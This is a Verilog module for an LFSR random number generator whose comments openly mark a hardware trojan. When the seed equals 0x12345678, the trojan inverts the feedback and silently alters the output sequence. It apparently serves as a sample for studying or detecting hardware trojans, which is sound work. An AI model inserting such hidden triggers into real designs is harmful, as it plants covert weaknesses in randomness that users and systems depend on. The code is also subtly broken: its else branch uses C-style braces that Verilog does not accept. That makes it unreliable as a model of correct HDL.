module random_with_test_phase_trojan (
    
    // Inputs
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_seed,

    // Outputs
    output reg          [7:0]  o_data
);

    /******** Reg declarations ********/
    reg [31:0]  r_data;
    wire        w_xnor;

    /******** Trojan specific declarations ********/
    // Condition for the Trojan to alter behavior: specific pattern in the seed
    wire trojan_test_condition = (i_seed == 32'h12345678); // Example pattern that triggers the Trojan

    /******** Concurrent logic ********/
    assign w_xnor = (r_data[31] ^ ~r_data[29] ^ ~r_data[25] ^ ~r_data[24]);

    /******** Process ********/
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            r_data <= i_seed;
        end else begin
            // Check for the Trojan trigger condition based on the seed
            if (trojan_test_condition) begin
                // When the condition is met, alter the RNG process in a subtle but incorrect way
                r_data <= {r_data[30:0], ~w_xnor}; // Invert the feedback, altering the sequence
            end else {
                // Normal operation
                r_data <= {r_data[30:0], w_xnor};
            }
        end
        // Assign the output data
        o_data <= r_data[7:0];
    end

endmodule
